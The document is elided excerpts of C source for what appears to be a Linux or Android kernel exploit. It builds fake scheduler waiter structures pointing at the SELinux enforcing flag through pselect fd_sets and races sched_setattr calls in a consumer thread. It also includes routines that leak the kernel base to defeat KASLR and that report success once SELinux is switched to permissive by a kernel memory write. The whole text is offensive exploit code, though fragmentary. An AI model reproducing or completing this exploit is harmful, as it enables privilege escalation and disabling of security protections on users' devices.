...
void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  ...
  struct slide_waiter_word {
    ...
    {1, 0, "tree_right"},
    {2, P0_DATA_ALIAS_CONST(SELINUX_ENFORCING), "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, SLIDE_LOGGERS_0_1, "pi0"},
    {6, 0, "pi1"},
    {7, P0_DATA_ALIAS_CONST(SELINUX_ENFORCING), "pi2"},
...
void *slide_consumer_thread(void *arg __attribute__((unused))) {
  ...
  for (;;) {
    ...
    errno = 0;
    long alive_ret = syscall(131, getpid(), tid, 0);
    int alive_errno = errno;
    errno = 0;
    long ret = sched_setattr_tid(tid, (calls % 19) + 1);
    int saved_errno = errno;
    pr_info("slide consumer sched tid=%d alive_ret=%ld alive_errno=%d sched_ret=%ld sched_errno=%d\n",
...
uint64_t slide_read_stext(void) {
  ...
  pr_info("slide boot_id hex: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x leaked=%016llx\n",
...
#define SELINUX_PERMISSIVE_MAGIC  0xDEAD000000000001ULL
...
uint64_t slide_child_leak_stext(void) {
  ...
  if (enforce_fd >= 0) {
    char enforce_buf[2] = {0};
    read(enforce_fd, enforce_buf, sizeof(enforce_buf) - 1);
    close(enforce_fd);
    if (enforce_buf[0] == '0') {
      pr_success("SELINUX PERMISSIVE after pselect! returning magic\n");
      return SELINUX_PERMISSIVE_MAGIC;
    }
    pr_info("selinux enforce still=%c\n", enforce_buf[0]);
  }
...
int slide_leak_kernel_base(void) {
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    ...
    if (stext == SELINUX_PERMISSIVE_MAGIC) {
      pr_success("SELINUX PERMISSIVE achieved via direct RB write!\n");
      kaslr_done = 1;
